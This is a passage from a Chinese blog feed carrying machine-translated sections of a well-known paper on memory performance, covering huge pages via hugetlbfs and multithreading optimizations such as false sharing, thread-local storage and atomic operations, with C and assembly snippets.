中。这给了程序员足够的控制权。</p><p>对于那些愿意投入更多时间的人，已经有成功的尝试，使用自动调用跟踪通过 gcc 在使用 <code>-finstrument-functions</code> 选项调用时插入的 <code>__cyg_profile_func_enter</code> 和 <code>__cyg_profile_func_exit</code> 钩子来进行重新排序 [oooreorder]。有关这些 <code>__cyg_*</code> 接口的更多信息，请参阅 gcc 手册。通过创建程序执行的跟踪，程序员可以更准确地确定调用链。在 [oooreorder] 中的结果是启动成本减少了 5%，仅仅通过重新排序函数。主要的好处是减少了页面错误的数量，但 TLB 缓存也起了作用——鉴于在虚拟化环境中，TLB 未命中变得更加昂贵，这是一个越来越重要的作用。</p><p>通过结合 pagein 工具的分析和调用序列信息，应该可以优化程序的某些阶段（如启动）以最小化页面错误的数量。</p><p>Linux 内核提供了两种额外的机制来避免页面错误。第一种是 <code>mmap</code> 的标志，它指示内核不仅要修改页面表，而且实际上要预先错误映射区域中的所有页面。这可以通过简单地将 <code>MAP_POPULATE</code> 标志添加到 <code>mmap</code> 调用的第四个参数来实现。这将使 <code>mmap</code> 调用的成本显著增加，但是，如果调用映射的所有页面立即被使用，好处可能是巨大的。而不是有一个相当昂贵的页面错误，由于同步要求等的开销，程序将有一个更昂贵的 <code>mmap</code> 调用。使用这个标志有缺点，尽管，在映射的页面中大部分未在调用后不久（或根本不）使用的情况下。未映射的未使用页面显然是浪费时间和内存。立即预先错误并仅在后来使用页面也可能堵塞系统。内存在被使用之前就被分配了，这可能会导致同时出现内存短缺。另一方面，在最坏的情况下，页面简单地被重新用于新的目的（因为它还没有被修改），这不是那么昂贵，但与分配一起，还是增加了一些成本。</p><p><code>MAP_POPULATE</code> 的粒度太粗了。还有第二个可能的问题：这是一种优化；并不关键的是所有页面确实被映射了。</p><p>如果系统太忙而无法执行操作，预先错误可以被丢弃。一旦页面真正被使用，程序就会采取页面错误，但这并不比人为地创建资源稀缺更糟糕。另一种选择是使用 <code>posix_madvise</code> 函数的 <code>POSIX_MADV_WILLNEED</code> 建议。这是对操作系统的一个提示，表明程序在不久的将来将需要调用中描述的页面。内核可以自由地忽略该建议，但它也可以预先错误页面。这里的优势在于粒度更细。任何映射地址空间区域中的单个页面或页面范围都可以预先错误。对于在运行时不使用大量数据的内存映射文件，这可能比使用 <code>MAP_POPULATE</code> 有巨大的优势。</p><p>除了这些主动减少页面错误数量的方法，还可以采取更被动的方法，这在硬件设计师中很受欢迎。DSO 在地址空间中占用相邻页面，一个页面范围用于代码，一个页面范围用于数据。页面大小越小，容纳 DSO 所需的页面就越多。这反过来意味着页面错误也更多。重要的是，相反的情况也是正确的。对于更大的页面大小，映射（或匿名内存）所需的页面数减少；随之页面错误数量也减少。</p><p>大多数架构支持 4k 的页面大小。在 IA-64 和 PPC64 上，64k 的页面大小也很流行。这意味着内存分配的最小单位是 64k。该值必须在编译内核时指定，并且不能动态更改（至少目前不能）。多页面大小架构的 ABI 设计为允许使用任一页面大小运行应用程序。运行时将进行必要的调整，正确编写的程序不会注意到任何问题。更大的页面大小意味着通过部分使用的页面造成更多的浪费，但在某些情况下，这是可以接受的。</p><p>大多数架构还支持 1MB 或更大的非常大页面大小。在某些情况下，这样的页面也是有用的，但让所有内存都以这么大的单位分配是没有意义的。物理 RAM 的浪费将太大了。但是非常大的页面有其优势：如果使用巨大的数据集，在 x86-64 上使用 2MB 页面存储将比使用 4k 页面少 511 个页面错误（每个大页面）。这可能产生很大的影响。解决方案是选择性地请求内存分配，即，仅在请求的地址范围内使用巨大的内存页面，并且对于同一进程中的所有其他映射使用正常的页面大小。</p><p>非常大的页面大小确实有其代价。由于用于大页面的物理内存必须是连续的，所以可能在一段时间后，由于内存碎片化，可能无法分配这样的页面。为了防止这种情况发生，人们正在研究内存碎片整理和避免碎片化，但这非常复杂。对于大约 2MB 的大页面，所需的 512 个连续页面总是难以获得，除非在系统启动时。这就是为什么当前大页面的解决方案需要使用一个特殊的文件系统 <code>hugetlbfs</code>。这个伪文件系统由系统管理员通过写入应该保留的大页面数量来按需分配。</p><p>后来，当程序需要一个大页面时，有多种可能性：</p><ul><li>程序可以使用带有 <code>SHM_HUGETLB</code> 标志的 System V 共享内存。</li><li>可以实际挂载 <code>hugetlbfs</code> 文件系统，然后程序可以在挂载点下创建一个文件，并使用 <code>mmap</code> 将一个或多个页面映射为匿名内存。</li></ul><p>在第一种情况下，不需要挂载 <code>hugetlbfs</code>。请求一个或多个大页面的代码可能如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">key_t</span> k = ftok(<span class="hljs-string">&quot;some/key/file&quot;</span>, <span class="hljs-number">42</span>);<br><span class="hljs-type">int</span> id = shmget(k, LENGTH, SHM_HUGETLB|IPC_CREAT|SHM_R|SHM_W);<br><span class="hljs-type">void</span> *a = shmat(id, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>这段代码的关键部分是使用 <code>SHM_HUGETLB</code> 标志和为 <code>LENGTH</code> 选择正确的值，该值必须是系统的大页面大小的倍数。不同的架构有不同的值。使用 System V 共享内存接口有一个讨厌的问题，那就是依赖于键参数来区分（或共享）映射。<code>ftok</code> 接口很容易产生冲突，这就是为什么，如果可能的话，最好使用其他机制。</p><p>如果使用 <code>hugetlbfs</code> 文件系统的挂载不是一个问题，那么最好使用它而不是 System V 共享内存。使用特殊文件系统的唯一真正问题是内核必须支持它，而且还没有标准化的挂载点。一旦文件系统被挂载，例如在 <code>/dev/hugetlb</code>，程序可以轻松使用它：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/dev/hugetlb/file1&quot;</span>, O_RDWR|O_CREAT, <span class="hljs-number">0700</span>);<br><span class="hljs-type">void</span> *a = mmap(<span class="hljs-literal">NULL</span>, LENGTH, PROT_READ|PROT_WRITE, fd, <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>通过在 <code>open</code> 调用中使用相同的文件名，多个进程可以共享相同的大页面并协作。也可以使页面可执行，在这种情况下，必须在 <code>mmap</code> 调用中设置 <code>PROT_EXEC</code> 标志。与 System V 共享内存示例一样，<code>LENGTH</code> 的值必须是系统大页面大小的倍数。</p><p>一个防御性编写的程序（像所有程序一样）可以使用以下函数在运行时确定挂载点：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> *<span class="hljs-title function_">hugetlbfs_mntpoint</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>   <span class="hljs-type">char</span> *result = <span class="hljs-literal">NULL</span>;<br>   FILE *fp = setmntent(_PATH_MOUNTED, <span class="hljs-string">&quot;r&quot;</span>);<br>   <span class="hljs-keyword">if</span> (fp != <span class="hljs-literal">NULL</span>) &#123;<br>      <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mntent</span> *<span class="hljs-title">m</span>;</span><br>      <span class="hljs-keyword">while</span> ((m = getmntent(fp)) != <span class="hljs-literal">NULL</span>)<br>         <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(m-&gt;mnt_fsname, <span class="hljs-string">&quot;hugetlbfs&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br>            result = strdup(m-&gt;mnt_dir);<br>            <span class="hljs-keyword">break</span>;<br>         &#125;<br>      endmntent(fp);<br>   &#125;<br>   <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>有关这两种情况的更多信息可以在 kernel source tree 中的 hugetlbpage.txt 文件中找到。该文件还描述了 IA-64 所需的特殊处理。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404292147282.png"></p><p>图 7.9 显示了使用大页面运行随机 Follow 测试的结果，<code>NPAD</code> &#x3D;0。这是图 3.15 中显示的相同数据，但这次，我们还使用在大页面中分配的内存来测量数据。可以看到性能优势可能是巨大的。对于 220 字节，使用大页面的测试比原来快 57%。这是因为该大小仍然完全适合单个 2MB 页面，因此不会发生 DTLB 未命中。</p><p>在此之后，收益最初较小，但随着工作集大小的增加而再次增长。对于 512MB 工作集大小，使用大页面的测试比原来快 38%。大页面测试的曲线在大约 250 个周期处有一个平台。在工作集大小超过 227 字节后，数字再次显著上升。平台的原因是 64 个 TLB 条目对于 2MB 页面覆盖了 227 字节。</p><p>正如这些数字所示，使用大工作集大小的成本的很大一部分来自 TLB 未命中。使用本节描述的接口可能会带来巨大的收益。图中的数字很可能是上限，但即使在现实世界的程序中，也显示出显著的加速。数据库是今天使用大页面的程序之一，因为它们使用了大量的数据。</p><p>目前没有办法使用大页面来映射文件支持的数据。有兴趣实现这种能力，但迄今为止提出的建议都涉及明确使用大页面，并且依赖于 <code>hugetlbfs</code> 文件系统。这是不可接受的：在这种情况下，大页面的使用必须是透明的。内核可以轻松确定哪些映射是大的，并自动使用大页面。一个大问题是内核并不总是知道使用模式。如果内存，可以作为大页面映射，后来需要 4k 页面粒度（例如，因为使用 <code>mprotect</code> 更改了内存范围的部分保护），大量宝贵的资源，特别是线性物理内存，将被浪费。因此，可能还需要一段时间才能成功实现这种方法。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://lwn.net/Articles/257209/">原文</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>内存</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>每一个程序员都应该了解的内存知识-Part6</title>
    <link href="/2024/04/29/%E6%AF%8F%E4%B8%80%E4%B8%AA%E7%A8%8B%E5%BA%8F%E5%91%98%E9%83%BD%E5%BA%94%E8%AF%A5%E4%BA%86%E8%A7%A3%E7%9A%84%E5%86%85%E5%AD%98%E7%9F%A5%E8%AF%86-Part6/"/>
    <url>/2024/04/29/%E6%AF%8F%E4%B8%80%E4%B8%AA%E7%A8%8B%E5%BA%8F%E5%91%98%E9%83%BD%E5%BA%94%E8%AF%A5%E4%BA%86%E8%A7%A3%E7%9A%84%E5%86%85%E5%AD%98%E7%9F%A5%E8%AF%86-Part6/</url>
    
    <content type="html"><![CDATA[<p>多线程优化</p><span id="more"></span><p><strong>注意：这篇文章使用 <code>Kimi AI</code> 进行翻译</strong></p><h3 id="6-4-多线程优化"><a href="#6-4-多线程优化" class="headerlink" title="6.4 多线程优化"></a>6.4 多线程优化</h3><p>当涉及到多线程时，有三个不同的缓存使用方面很重要：</p><ul><li>并发性</li><li>原子性</li><li>带宽</li></ul><p>这些方面也适用于多进程情况，但由于多个进程（大多数情况下）是独立的，因此优化它们并不容易。可能的多进程优化是多线程场景中可用优化的一个子集。因此，我们将在这里专门处理后者。</p><p>这里的并发性指的是，当同时运行多个线程时，进程经历的内存效应。线程的一个属性是它们都共享相同的地址空间，因此都可以访问相同的内存。在理想情况下，线程使用的内存区域是不同的，在这种情况下，这些线程之间的耦合度很低（例如，共同的输入和&#x2F;或输出）。如果多个线程使用相同的数据，则需要协调；这时原子性就发挥作用了。最后，根据机器架构，处理器可用的内存和处理器之间的总线带宽是有限的。我们将在以下各节中分别处理这三个方面——尽管它们当然密切相关。</p><h4 id="6-4-1-并发性优化"><a href="#6-4-1-并发性优化" class="headerlink" title="6.4.1 并发性优化"></a>6.4.1 并发性优化</h4><p>最初，在本节中，我们将讨论两个单独的问题，实际上它们需要相反的优化。多线程应用程序在其某些线程中使用公共数据。正常的缓存优化要求保持数据在一起，以便应用程序的占用空间小，从而最大化适合任何时候缓存的内存量。</p><p>这种方法存在一个问题：如果多个线程写入同一内存位置，缓存行必须在各自核心的 L1d 中处于“E”（独占）状态。这意味着会发送很多 RFO（远程填充操作）请求，在最坏的情况下，每个写入访问都要发送一个。因此，正常的写入突然变得非常昂贵。如果使用相同的内存位置，需要同步（可能通过使用原子操作，这在下一节中处理）。问题也很明显，当所有线程都使用不同的内存位置并且应该是独立的时。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404292018420.png"></p><blockquote><p><strong>图 6.10：并发缓存行访问开销</strong></p></blockquote><p>图 6.10 显示了这种“错误共享”的结果。测试程序（在第 9.3 节中显示）创建了一些线程，它们除了递增一个内存位置（5 亿次）之外什么都不做。测量的时间是从程序开始到程序在等待最后一个线程后结束。线程被固定在单独的处理器上。机器有四个 P4 处理器。蓝色值表示将每个线程的内存分配放置在单独缓存行的运行。红色部分是当线程的位置移动到仅有一个缓存行时发生的惩罚。</p><p>蓝色测量值（使用单独的缓存行）符合预期。程序在多线程上没有惩罚地进行扩展。每个处理器将其缓存行保持在自己的 L1d 中，并且没有带宽问题，因为不需要读取太多代码或数据（实际上，它们都被缓存了）。测量的轻微增加确实是系统噪声，可能是一些预取效果（线程使用顺序缓存行）。</p><p>通过将使用一个缓存行的时间与每个线程使用单独缓存行的时间进行比较计算出的开销是 390%，734% 和 1,147%。这些大数字乍一看可能会令人惊讶，但考虑到所需的缓存交互，应该是显而易见的。缓存行在一个处理器的缓存中被拉出，就在它完成写入缓存行之后。除了在任何给定时刻拥有缓存行的那个处理器之外，所有处理器都被延迟并且无法做任何事情。每个额外的处理器只会带来更多的延迟。</p><p>从这些测量中可以清楚地看出，必须避免在程序中的这种情况。鉴于巨大的惩罚，这个问题在许多情况下是显而易见的（至少分析会显示代码位置），但现代硬件上存在一个陷阱。图 6.11 显示了在单处理器、四核机器（Intel Core 2 QX 6700）上运行代码时的等效测量。即使这种处理器的两个独立的 L2，测试用例也没有显示出任何可扩展性问题。当多次使用相同的缓存行时，会有轻微的开销，但它不会随着核心数的增加而增加。{ _我无法解释当所有四个核心都使用时数字较低的原因，但它是可重现的。} 如果使用这些处理器中的多个，我们当然会看到类似于图 6.10 的结果。尽管多核处理器的使用日益增加，许多机器仍将继续使用多个处理器，因此正确处理这种情况很重要，这可能意味着在真正的 SMP 机器上测试代码。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404292018201.png"></p><blockquote><p><strong>图 6.11：开销，四核</strong></p></blockquote><p>有一个非常简单的“修复”方法：将每个变量放在自己的缓存行上。这是与前面提到的优化相冲突的地方，具体来说，应用程序的占用空间将大大增加。这是不可接受的；因此，有必要提出一个更聪明的解决方案。</p><p>需要的是识别哪些变量只由一个线程一次使用，那些只由一个线程使用的，以及可能在某些时候有争议的变量。每种情况都有不同的解决方案，并且是有用的。区分变量的最基本标准是：它们是否曾经被写入，以及这种情况发生的频率如何。</p><p>从不写入的变量以及那些只初始化一次的变量基本上是常量。由于 RFO 请求只需要写操作，常量可以在缓存中共享（‘S’ 状态）。因此，这些变量不需要特别处理；将它们组合在一起是可以的。如果程序员正确地用 <code>const</code> 标记变量，工具链将把变量从正常变量移开，进入 <code>.rodata</code>（只读数据）或 <code>.data.rel.ro</code>（重新定位后的只读）节。不需要其他特殊操作。如果出于某种原因，变量不能正确地用 <code>const</code> 标记，程序员可以通过将它们分配到特殊节来影响它们的放置。</p><p>当链接器构建最终二进制文件时，它首先将所有输入文件中同名的节附加在一起；然后这些节按照链接器脚本确定的顺序排列。这意味着，通过将所有基本上只是常量但未标记为如此的变量移动到特殊节中，程序员可以将所有这些变量组合在一起。在它们之间不会有经常写入的变量。通过适当对齐该节中的第一个变量，可以确保不会发生错误共享。假设这个小例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> foo = <span class="hljs-number">1</span>;<br><span class="hljs-type">int</span> bar __attribute__((section(<span class="hljs-string">&quot;.data.ro&quot;</span>))) = <span class="hljs-number">2</span>;<br><span class="hljs-type">int</span> baz = <span class="hljs-number">3</span>;<br><span class="hljs-type">int</span> xyzzy __attribute__((section(<span class="hljs-string">&quot;.data.ro&quot;</span>))) = <span class="hljs-number">4</span>;<br></code></pre></td></tr></table></figure><p>如果编译，这个输入文件定义了四个变量。有趣的部分是，变量 <code>foo</code> 和 <code>baz</code>，以及 <code>bar</code> 和 <code>xyzzy</code> 分别组合在一起。没有属性定义，编译器将在它们在源代码中定义的顺序中将所有四个变量分配到名为 <code>.data</code> 的节中。{ _这不是由 ISO C 标准保证的，但是 gcc 的工作方式。} 有了代码本身，变量 <code>bar</code> 和 <code>xyzzy</code> 被放置在名为 <code>.data.ro</code> 的节中。节名 <code>.data.ro</code> 大体上是任意的。前缀 <code>.data.</code> 保证了 GNU 链接器将与其它数据节一起放置该节。</p><p>同样的技术可以应用于分离大多数时候读取但偶尔写入的变量。只需选择一个不同的节名。在某些情况下，例如 Linux 内核，这种分离似乎是有意义的。</p><p>如果变量只由一个线程使用，则有另一种指定变量的方式。在这种情况下，使用线程局部变量（见 [mytls]）是可能且有用的。</p><p>在 gcc 中，C 和 C++ 语言允许使用 <code>__thread</code> 关键字将变量定义为每个线程的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> foo = <span class="hljs-number">1</span>;<br>__thread <span class="hljs-type">int</span> bar = <span class="hljs-number">2</span>;<br><span class="hljs-type">int</span> baz = <span class="hljs-number">3</span>;<br>__thread <span class="hljs-type">int</span> xyzzy = <span class="hljs-number">4</span>;<br></code></pre></td></tr></table></figure><p>变量 <code>bar</code> 和 <code>xyzzy</code> 不是在正常的数据段中分配的；相反，每个线程都有自己的单独区域，用于存储这样的变量。这些变量可以有静态初始化器。所有线程局部变量都可以被所有其他线程访问，但除非一个线程将指向线程局部变量的指针传递给其他线程，否则其他线程无法找到该变量。由于变量是线程局部的，因此不会出现错误共享——除非程序人为地创建了问题。这个解决方案很容易设置（编译器和链接器做了所有工作），但它有它的成本。当创建线程时，它必须花一些时间设置线程局部变量，这需要时间和内存。此外，访问线程局部变量通常比使用全局或自动变量更昂贵（见 [mytls] 以了解如何自动最小化这些成本，如果可能的话）。</p><p>使用线程局部存储（TLS）的一个缺点是，如果变量的使用转移到另一个线程，旧线程中的当前变量值对新线程不可用。每个线程的变量副本是不同的。通常这根本不是问题，如果它是，那么在转移到新线程时需要协调，此时可以复制当前值。</p><p>第二个更大的问题是可能的资源浪费。如果一个变量一次只由一个线程使用，所有线程都必须在内存方面付出代价。如果一个线程在 DSO 中没有使用任何 TLS 变量，TLS 内存区域的延迟分配将防止这成为一个问题（除了应用程序本身的 TLS）。如果一个线程在某个 DSO 中只使用了一个 TLS 变量，该对象中所有其他 TLS 变量的内存也将被分配。如果大规模使用 TLS 变量，这可能会累积起来。</p><p>通常可以给出的最佳建议是：</p><ol><li>至少将只读（初始化后）和读写变量分开。也许可以将读取为主的变量作为第三类扩展这种分离。</li><li>将一起使用的读写变量组合成一个结构体。使用结构体是确保所有这些变量的内存位置以一致的方式紧密组合在一起的唯一方法，这种方式由所有 gcc 版本一致翻译。</li><li>将经常由不同线程写入的读写变量移动到它们自己的缓存行上。这可能意味着在末尾添加填充以填满缓存行的剩余部分。如果与第 2 步结合，这通常并不真的是浪费。扩展上面的例子，我们可能会得到如下代码（假设 <code>bar</code> 和 <code>xyzzy</code> 打算一起使用）：</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> foo = <span class="hljs-number">1</span>;<br><span class="hljs-type">int</span> baz = <span class="hljs-number">3</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">al1</span> &#123;</span><br>    <span class="hljs-type">int</span> bar;<br>    <span class="hljs-type">int</span> xyzzy;<br>  &#125;;<br>  <span class="hljs-type">char</span> pad[CLSIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> al1)];<br>&#125; rwstruct __attribute__((aligned(CLSIZE))) =<br>  &#123; &#123; .bar = <span class="hljs-number">2</span>, .xyzzy = <span class="hljs-number">4</span> &#125; &#125;;<br></code></pre></td></tr></table></figure><p>一些代码更改是必要的（对 <code>bar</code> 的引用必须替换为 <code>rwstruct.bar</code>，对 <code>xyzzy</code> 也是如此），但就是这样。编译器和链接器做了所有其他工作。{ _此代码必须使用 <code>-fms-extensions</code> 在命令行上编译。}</p><ol start="4"><li>如果一个变量由多个线程使用，但每次使用都是独立的，将变量移动到 TLS 中。</li></ol><h4 id="6-4-2-原子性优化"><a href="#6-4-2-原子性优化" class="headerlink" title="6.4.2 原子性优化"></a>6.4.2 原子性优化</h4><p>如果多个线程同时修改相同的内存位置，处理器不保证任何特定结果。这是一个故意的决定，以避免在 99.999% 的所有情况下都不必要的成本。例如，如果一个内存位置处于‘S’状态，并且两个线程同时必须递增其值，执行管道不必等待缓存行在‘E’状态下可用后再从缓存中读取旧值以执行加法。相反，它读取当前在缓存中的值，并且一旦缓存行在‘E’状态下可用，新值就会被写回。如果两个线程中的两次缓存读取同时发生，结果将不是预期的；一次加法将会丢失。</p><p>为了确保这不会发生，处理器提供了原子操作。这些原子操作例如，不会在可以以原子方式执行加法的方式进行加法之前读取旧值。除了等待其他核心和处理器外，一些处理器甚至为特定地址的原子操作向主板上的其他设备发出信号。所有这些都使原子操作变慢。</p><p>处理器供应商决定提供不同的原子操作集。早期的 RISC 处理器，符合‘R’代表减少的原则，提供的原子操作非常少，有时只有一个原子位设置和测试。{ <em>HP Parisc 仍然没有提供更多…</em>} 在另一个极端，我们有 x86 和 x86-64，它们提供了大量的原子操作。通常可用的原子操作可以分为四类：</p><p><strong>位测试</strong> </p><p>这些操作原子地设置或清除一个位，并返回一个状态，指示位之前是否设置。</p><p><strong>加载锁定&#x2F;存储条件（LL&#x2F;SC）</strong> </p><p>{ _有些人使用“链接”而不是“锁定”，这都是一样的。}</p><p>这些操作作为一对工作，其中特殊的加载指令用于启动事务，最终的存储只有在同时间没有被修改的情况下才会成功。存储操作指示成功或失败，因此程序可以根据需要重复努力。</p><p><strong>比较并交换（CAS）</strong> </p><p>这是一个三元操作，它只将作为参数提供的值写入地址（第二个参数），如果当前值与第三个参数值相同。</p><p><strong>原子算术</strong> </p><p>这些操作只在 x86 和 x86-64 上可用，可以在内存位置执行算术和逻辑操作。这些处理器支持这些操作的非原子版本，但 RISC 架构不支持。因此，它们的可用性受到限制。</p><p>一个架构支持 LL&#x2F;SC 或 CAS 指令，而不是两者。两种方法基本上等效；它们同样好地实现原子算术操作，但 CAS 似乎是目前首选的方法。所有其他操作都可以使用它间接实现。例如，原子加法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> curval;<br><span class="hljs-type">int</span> newval;<br><span class="hljs-keyword">do</span> &#123;<br>  curval = var;<br>  newval = curval + addend;<br>&#125; <span class="hljs-keyword">while</span> (CAS(&amp;var, curval, newval));<br></code></pre></td></tr></table></figure><p><code>CAS</code> 调用的结果表明操作是否成功。如果它返回失败（非零值），循环再次运行，执行加法，并再次尝试 CAS 调用。这会重复，直到成功。代码值得注意的是，内存位置的地址必须在两个单独的指令中计算。{ <em>x86 和</em> x86-64 上的 <code>CAS</code> 操作码可以在第二和后续迭代中避免加载值，但在这个平台上，我们可以以更简单的方式编写原子加法，使用单个加法操作码。} 对于 LL&#x2F;SC，代码看起来大致相同。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> curval;<br><span class="hljs-type">int</span> newval;<br><span class="hljs-keyword">do</span> &#123;<br>  curval = LL(var);<br>  newval = curval + addend;<br>&#125; <span class="hljs-keyword">while</span> (SC(var, newval));<br></code></pre></td></tr></table></figure><p>这里我们必须使用特殊的加载指令（<code>LL</code>），并且我们不需要将内存位置的当前值传递给 <code>SC</code>，因为处理器知道同时间内存位置是否被修改了。</p><p>大的区别是 x86 和 x86-64，我们有原子操作，在这里，选择适当的原子操作以实现最佳结果很重要。图 6.12 显示了实现原子增量操作的三种不同方式。</p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td><strong>1. 加法并读取结果</strong></td><td>for (i &#x3D; 0; i &lt; N; ++i) __sync_add_and_fetch(&amp;var,1);</td></tr><tr><td><strong>2. 加法并返回旧值</strong></td><td>for (i &#x3D; 0; i &lt; N; ++i) __sync_fetch_and_add(&amp;var,1);</td></tr><tr><td><strong>3. 原子替换新值</strong></td><td>for (i &#x3D; 0; i &lt; N; ++i) { long v, n; do { v &#x3D; var; n &#x3D; v + 1; } while (!__sync_bool_compare_and_swap(&amp;var, v, n)); }</td></tr></tbody></table><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404292020023.png"><br>图 6.12：循环中的原子增量</p><p>所有三种方式在 x86 和 x86-64 上产生不同的代码，而在其他架构上代码可能相同。性能差异很大。下表显示了四个并发线程执行 100 万次增量的执行时间。代码使用了 gcc 的内置原语（<code>__sync_</code> *）。</p><table><thead><tr><th>1. 交换加法</th><th>2. 加法并读取结果</th><th>3. CAS</th></tr></thead><tbody><tr><td>0.23s</td><td>0.21s</td><td>0.73s</td></tr></tbody></table><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404292020440.png"></p><p>前两个数字相似；我们看到返回旧值稍微快一些。重要的信息是突出显示的字段，使用 CAS 时的成本。不出所料，它的成本要高得多。原因有几个：1. 有两次内存操作，2. CAS 操作本身更复杂，甚至需要条件操作，3. 如果两个并发访问导致 CAS 调用失败，整个操作必须在循环中重复。现在读者可能会问：为什么有人使用复杂且更长的代码，使用 CAS？答案是：复杂性通常被隐藏了。如前所述，CAS 目前是所有有趣架构的统一原子操作。因此，有些人认为用 CAS 定义所有原子操作就足够了。这使得程序更简单。但正如数字所示，结果可能远非最优。CAS 解决方案的内存处理开销是巨大的。以下说明了两个线程的执行，每个线程在自己的核心上。</p><table><thead><tr><th>线程 #1</th><th>线程 #2</th><th><code>var</code> 缓存状态</th></tr></thead><tbody><tr><td><code>v = var</code></td><td></td><td>‘E’ on Proc 1</td></tr><tr><td><code>n = v + 1</code></td><td><code>v = var</code></td><td>‘S’ on Proc 1+2</td></tr><tr><td>CAS(<code>var</code>)</td><td><code>n = v + 1</code></td><td>‘E’ on Proc 1</td></tr><tr><td></td><td>CAS(<code>var</code>)</td><td>‘E’ on Proc 2</td></tr></tbody></table><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404292020889.png"></p><p>我们看到，在这个短暂的执行期内，缓存行状态至少改变了三次；其中两次是 RFO。另外，第二个 CAS 将失败，因此该线程必须重复整个操作。在该操作期间，同样的情况可能会再次发生。</p><p>相比之下，当使用原子算术操作时，处理器可以将执行加法（或任何其他操作）所需的加载和存储操作保持在一起。它可以确保同时发出的缓存行请求被阻塞，直到原子操作完成。因此，示例中的每个循环迭代最多导致一个 RFO 缓存请求，没有其他。所有这些意味着，定义机器抽象的级别至关重要，以便可以利用原子算术和逻辑操作。不应将 CAS 普遍用作统一机制。</p><p>对于大多数处理器，原子操作本身始终是原子的。只有通过为不需要原子性的情况提供完全独立的代码路径来避免它们。这意味着更多的代码、条件语句和进一步的跳转到适当执行的直接执行。对于 x86 和 x86-64，情况有所不同：相同的指令可以以原子和非原子方式使用。要使它们原子，可以使用特殊前缀：<code>lock</code> 前缀。这为原子操作提供了避免高成本的机会，如果给定情况下不需要原子性要求。例如，库中的通用代码，如果需要，总是必须是线程安全的，可以从中受益。编写代码时不需要信息，决策可以在运行时做出。技巧是跳过 <code>lock</code> 前缀。这个技巧适用于 x86 和 x86-64 处理器允许使用 <code>lock</code> 前缀的所有指令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asm">    cmpl $, multiple_threads<br>    je   1f<br>    lock<br>1:  add  $1, some_var<br></code></pre></td></tr></table></figure><p>如果这段汇编代码看起来难以理解，不用担心，它很简单。第一条指令检查变量是零还是非零。在这种情况下，非零表示多个线程正在运行。如果值为零，则执行第二条指令跳转到标签 <code>1</code>。否则，执行下一条指令。这是棘手的部分。如果 <code>je</code> 指令没有跳转，<code>add</code> 指令将带 <code>lock</code> 前缀执行。否则它将不带 <code>lock</code> 前缀执行。</p><p>添加一个相对昂贵的操作，如条件跳转（如果分支预测失败则昂贵）似乎适得其反。确实可能是：如果大多数时间运行多个线程，性能会进一步降低，特别是如果分支预测不正确。但如果许多情况下只使用一个线程，代码会快得多。使用 if-then-else 结构的替代方案在两种情况下都会引入一个额外的无条件跳转，可能会更慢。鉴于原子操作的成本大约为 200 